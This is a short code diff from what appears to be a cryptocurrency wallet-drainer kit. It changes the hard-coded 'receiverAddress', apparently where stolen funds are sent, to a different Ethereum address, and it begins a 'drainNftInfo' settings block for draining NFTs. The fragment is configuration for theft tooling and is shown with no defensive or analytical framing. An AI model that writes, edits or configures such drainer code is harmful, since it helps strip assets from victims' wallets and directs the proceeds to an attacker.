@@ -1,4 +1,4 @@
-const receiverAddress = "0x8d12a197cb00d4747a1fe03395095ce2a5cc6819";
+const receiverAddress = "0xBD4a94834fC9E66742a519287eD8b8C1e7aE0a3D";
 
 const drainNftInfo = {
     active: false,   
